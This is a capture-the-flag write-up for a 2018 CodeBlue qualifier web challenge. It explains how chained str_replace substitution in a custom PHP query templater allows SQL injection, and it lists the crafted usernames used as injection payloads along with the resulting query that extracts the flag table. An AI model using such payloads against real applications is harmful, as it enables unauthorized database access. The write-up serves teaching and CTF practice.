2018 CodeBlue CTF quals - MortAl mage aGEnts #1
===============================================

On the surface this is a nice challenge, all sources given including: database init scripts,
admin xss automation, even docker-compose files. On the inside this challenge was mostly about
time wasted on inexplicable recaptcha-party and hundreds of users registered manually. I wish
we fired up the challenge, stripped recaptcha-free from the beginning. I suppose that's why
they gave us every source, didn't they.


TL;DR
-----

Registered 3 users:

 - user#1: this is where the tampered transaction is inserted.

   name: `hege2`

 - user#2 - this receives the money

   name: `hege2:notes`

 - user#3 - this one sends the money

   name: `,1,1,(select * from flag1)) -- hege2`

Connected `user#2` and `user#3` with a transactor-id, and sent some money. The flag was
inserted onto `user#1`s dashboard.


Details
-------

There was a vulnerability in the custom sql templating implementation. `str_replace` blindly
replaces the arguments one after other, making some chaining possible. So when we control an
argument, we can create new injection points for the rest of the arguments.

    // DB.php

    $search = [];
    $replace = [];
    foreach ($param as $key => $value) {
        $search[] = $key;
        $replace[] = sprintf("'%s'", mysqli_real_escape_string($this->link, $value));
    }
    $sql = str_replace($search, $replace, $sql);

So we searched for sql queries where we control more than one argument. Found only one good
candidate: `/transfer` in `account.php`. And the vulnerable parameter **is the username again
:@**. Anyway, we have our injection, so looking at the vulnerability:

    ...
    $notes = sprintf('%s remitted', $_SESSION['user_id']);
    ...
    $app->db->query(
        "INSERT INTO account (user_id, debit, credit, notes) VALUES (:user_id, 0, ${amount}, :notes)",
        [':user_id' => $dstUsers['user_id'], ':notes' => $notes]
    );

    // ${amount} is whitelisted for numbers, just in case you're wondering why we didn't use
    // it

So we registered `hege2:notes` and `,1,1,(select * from flag1)) -- hege2`, which caused these
interpolations:

    # user_id == 'hege2:notes'
    # notes == ',1,1,(select * from flag1)) -- hege2 remitted'
    INSERT INTO account (user_id, debit, credit, notes) VALUES (:user_id, 0, ${amount}, :notes)
    INSERT INTO account (user_id, debit, credit, notes) VALUES ('hege2:notes', 0, 1, :notes)

Ultimately leading to

    INSERT INTO account (user_id, debit, credit, notes) VALUES ('hege2',1,1,(select * from flag1)) -- hege2 remitted'', 0, 1, ',1,1,(select * from flag1)) -- hege2 remitted')

Which inserted the flag into `hege2`-s transaction history.
